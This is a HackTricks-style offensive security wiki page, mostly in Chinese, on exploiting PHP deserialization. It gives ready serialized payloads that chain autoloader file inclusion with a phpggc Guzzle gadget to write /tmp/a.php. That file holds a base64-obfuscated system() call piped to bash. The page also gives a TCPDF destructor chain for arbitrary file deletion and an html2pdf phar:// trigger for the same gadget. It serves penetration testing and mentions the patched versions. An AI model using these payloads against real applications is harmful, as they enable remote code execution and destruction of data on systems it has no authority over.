# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

首先，你应该查看什么是 [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php)。

## PHP deserialization + spl_autoload_register + LFI/Gadget

我们遇到了一种情况：在一个 webapp 中发现了 **PHP deserialization**，但当前应用中没有任何在 **`phpggc`** 中列为可利用的 gadget。然而，在同一容器中存在另一个使用 composer 的 webapp，且该 webapp 含有易受攻击的库。因此，目标是 **加载另一个 webapp 的 composer loader** 并滥用它去 **加载一个 gadget，从而利用在易受反序列化攻击的 webapp 中的库**。

Steps:

- You have found a **deserialization** and there **isn’t any gadget** in the current app code
- You can abuse a **`spl_autoload_register`** function like the following to **load any local file with `.php` extension**
- For that you use a deserialization where the name of the class is going to be inside **`$name`**. You **cannot use "/" or "."** in a class name in a serialized object, but the **code** is **replacing** the **underscores** ("\_") **for slashes** ("/"). So a class name such as `tmp_passwd` will be transformed into `/tmp/passwd.php` and the code will try to load it.\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> 如果你有一个 **file upload** 并且可以上传扩展名为 **`.php` extension** 的文件，你可以**直接滥用此功能**并立即获得 **RCE**。

在我的案例中，我没有这种权限，但在**相同容器**内还有另一个使用 composer 的 web 页面，其中有一个对 `phpggc` gadget 漏洞的 library。

- 要加载这个其他库，首先你需要**加载那个 web app 的 composer loader**（因为当前应用的 loader 无法访问另一个应用的库）。**知道应用的路径**后，你可以很容易地用：**`O:28:"www_frontend_vendor_autoload":0:{}`**（在我的情况下，composer loader 位于 `/www/frontend/vendor/autoload.php`）
- 现在，你可以**load**其他**app composer loader**，接着就该**`generate the phpgcc`**要使用的**payload**了。在我的案例中，我使用了 **`Guzzle/FW1`**，它允许我**在文件系统中写入任意文件**。
- NOTE: 生成的 gadget 起初**不能正常工作**，为了让它工作，我**修改**了 phpgc 的该 payload **`chain.php`**，并将类的**所有 attribute**从 **private 到 public**。否则，在反序列化字符串后，创建对象的属性不会有任何值。
- 现在我们有了加载另一个 app composer loader 的方法并且有一个**可用的 phpggc payload**，但我们需要**在 SAME REQUEST 中完成此操作，以便在使用 gadget 时 loader 已被加载**。为此，我发送了一个包含两个对象的序列化数组，如下：
- 你可以看到**先加载 loader，然后是 payload**。
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 现在，我们可以 **创建并写入文件**，然而，用户 **无法在 web server 的任何文件夹中写入**。因此，如你在 payload 中所见，PHP 调用 **`system`** 携带一些 **base64** 被创建在 **`/tmp/a.php`**。然后，我们可以 **重用我们用于 LFI 的第一类 payload**，用来加载另一个 webapp 的 composer loader，以 **加载生成的 `/tmp/a.php`** 文件。只要把它添加到 deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**payload 的摘要**

- **加载同一容器中另一个 webapp 的 composer autoload**
- **加载 phpggc gadget** 来滥用另一个 webapp 的库（初始对 deserialization 易受影响的 webapp 在其库中没有可用的 gadget）
- 该 gadget 会在 /tmp/a.php 上 **create a file with a PHP payload**，其中包含恶意命令（webapp 用户无法写入任何 webapp 的任意文件夹）
- payload 的最后部分将 **load the generated php file**，从而执行命令

我需要 **call this deserialization twice**。在我的测试中，第一次 `/tmp/a.php` 文件被创建但未被加载，第二次则被正确加载。

## TCPDF `__destruct` POP chain 用于任意文件删除

当真实的 `TCPDF` 实例被垃圾回收时，它会调用 `_destroy(true)`，遍历 `$this->imagekeys`，并对任何看起来像是位于 `K_PATH_CACHE` 下的缓存文件执行 `unlink()`。如果应用在 `TCPDF` 类已被加载的情况下执行 `unserialize($user_data)`（例如它期望一个包含 `html` 键的数组），你可以提供一个序列化对象，其中设置：

- 将 `file_id` 设置为任意不在 `self::$cleaned_ids` 中的整数（例如 `-1`）。
- 将 `imagekeys` 设置为以 `K_PATH_CACHE` 开头的路径，或可伪装成如此的路径（例如当 `K_PATH_CACHE` 为 `/tmp/` 时使用 `/tmp/../tmp/do_not_delete_this_file.txt`）。

示例 payload 针对不安全的 `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` 流程：
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### 通过 html2pdf `<cert>` 标签中的 `phar://` 触发 gadget

`spipu/html2pdf` (≤5.3.0) 封装了 TCPDF，并暴露了一个自定义的 `<cert>` 区块，其 `src`/`privkey` 属性仅用 `file_exists()` 进行验证。在 PHP < 8.0 上，任何访问 `phar://` URL 的文件系统函数都会触发 Phar 元数据的反序列化。将上述恶意 TCPDF 对象存入 Phar archive 后，即使应用本身从未调用 `unserialize()`，也能获得可靠的 POP。

1. 在 `phar.readonly=0` 的环境下构造一个 Phar，将 stub/manifest 设置成看起来像图像（例如将 `archive.phar` 重命名为 `archive.png`），并把序列化的 TCPDF 对象存入 Phar 的元数据。
2. 将该文件上传/放置到可访问的位置，例如 /tmp/user_files/user_1/archive.png。
3. 提交包含 CERT 标签的 HTML，使 html2pdf 解析该由攻击者可控的路径：
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
对 `file_exists()` 的调用会反序列化元数据，实例化 TCPDF，并且其析构函数会删除所选文件，从而将 html2pdf 变成一个强大的 `phar://` 入口点。版本 5.3.1 添加了 `Security::checkValidPath()` 来阻止未经批准的 URI scheme，因此遗留部署仍然具有吸引力。

## 参考资料

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
